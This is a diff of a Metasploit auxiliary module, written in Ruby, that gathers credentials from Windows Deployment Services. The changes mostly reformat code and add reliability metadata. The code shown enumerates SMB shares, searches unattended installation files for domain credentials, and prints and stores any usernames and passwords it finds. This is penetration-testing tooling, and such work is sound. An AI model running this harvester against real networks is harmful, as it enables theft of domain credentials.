@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Exploit::Remote::SMB::Client::Authenticated
@@ -13,38 +12,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows Deployment Services Unattend Gatherer',
+        'Description' => %q{
           This module will search remote file shares for unattended installation files that may contain
           domain credentials. This is often used after discovering domain credentials with the
           auxiliary/scanner/dcerpc/windows_deployment_services module or in cases where you already
           have domain credentials. This module will connect to the RemInst share and any Microsoft
           Deployment Toolkit shares indicated by the share name comments.
-      },
-      'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        },
+        'Author' => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
           [ 'URL', 'http://rewtdance.blogspot.com/2012/11/windows-deployment-services-clear-text.html'],
         ],
-      ))
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(445),
         OptString.new('SMBDomain', [ false, "SMB Domain", '']),
-      ])
-
+      ]
+    )
   end
 
   # Determine the type of share based on an ID type value
   def share_type(val)
-    stypes = %W{ DISK PRINTER DEVICE IPC SPECIAL TEMPORARY }
+    stypes = %W{DISK PRINTER DEVICE IPC SPECIAL TEMPORARY}
     stypes[val] || 'UNKNOWN'
   end
-
 
   # Stolen from enumshares - Tried refactoring into simple client, but the two methods need to go in EXPLOIT::SMB and EXPLOIT::DCERPC
   # and then the lanman method calls the RPC method. Suggestions where to refactor to welcomed!
@@ -61,10 +66,10 @@ class MetasploitModule < Msf::Auxiliary
 
     stubdata =
       NDR.uwstring("\\\\#{rhost}") +
-      NDR.long(1)  #level
+      NDR.long(1) # level
 
-    ref_id = stubdata[0,4].unpack("V")[0]
-    ctr = [1, ref_id + 4 , 0, 0].pack("VVVV")
+    ref_id = stubdata[0, 4].unpack("V")[0]
+    ctr = [1, ref_id + 4, 0, 0].pack("VVVV")
 
     stubdata << ctr
     stubdata << NDR.align(ctr)
@@ -83,11 +88,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Level, CTR header, Reference ID of CTR
-    res.slice!(0,12)
+    res.slice!(0, 12)
     share_count = res.slice!(0, 4).unpack("V")[0]
 
     # Reference ID of CTR1
-    res.slice!(0,4)
+    res.slice!(0, 4)
     share_max_count = res.slice!(0, 4).unpack("V")[0]
 
     if share_max_count != share_count
@@ -95,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # ReferenceID / Type / ReferenceID of Comment
-    types = res.slice!(0, share_count * 12).scan(/.{12}/n).map{|a| a[4,2].unpack("v")[0]}
+    types = res.slice!(0, share_count * 12).scan(/.{12}/n).map { |a| a[4, 2].unpack("v")[0] }
 
     share_count.times do |t|
       length, offset, max_length = res.slice!(0, 12).unpack("VVV")
@@ -109,20 +114,20 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       name = res.slice!(0, 2 * length)
-      res.slice!(0,2) if length % 2 == 1 # pad
+      res.slice!(0, 2) if length % 2 == 1 # pad
 
       comment_length, comment_offset, comment_max_length = res.slice!(0, 12).unpack("VVV")
 
       if comment_offset != 0
-       fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share comment offset was not zero")
+        fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share comment offset was not zero")
       end
 
       if comment_length != comment_max_length
-         fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share comment max length was not length")
+        fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share comment max length was not length")
       end
 
       comment = res.slice!(0, 2 * comment_length)
-      res.slice!(0,2) if comment_length % 2 == 1 # pad
+      res.slice!(0, 2) if comment_length % 2 == 1 # pad
 
       shares << [ name, share_type(types[t]), comment]
     end
@@ -151,7 +156,6 @@ class MetasploitModule < Msf::Auxiliary
       deploy_shares.each do |deploy_share|
         query_share(deploy_share)
       end
-
     rescue ::Interrupt
       raise $!
     end
@@ -186,11 +190,9 @@ class MetasploitModule < Msf::Auxiliary
         print_good("Credentials: " +
           "Path=#{share_path}#{file_path} " +
           "Username=#{cred['domain'].to_s}\\#{cred['username'].to_s} " +
-          "Password=#{cred['password'].to_s}"
-        )
+          "Password=#{cred['password'].to_s}")
       end
     end
-
   end
 
   def report_cred(opts)
@@ -220,7 +222,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_client_unattend(data)
-
     begin
       xml = REXML::Document.new(data)
     rescue REXML::ParseException => e
@@ -232,6 +233,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def loot_unattend(data)
     return if data.empty?
+
     path = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
     print_good("Stored unattend.xml in #{path}")
   end
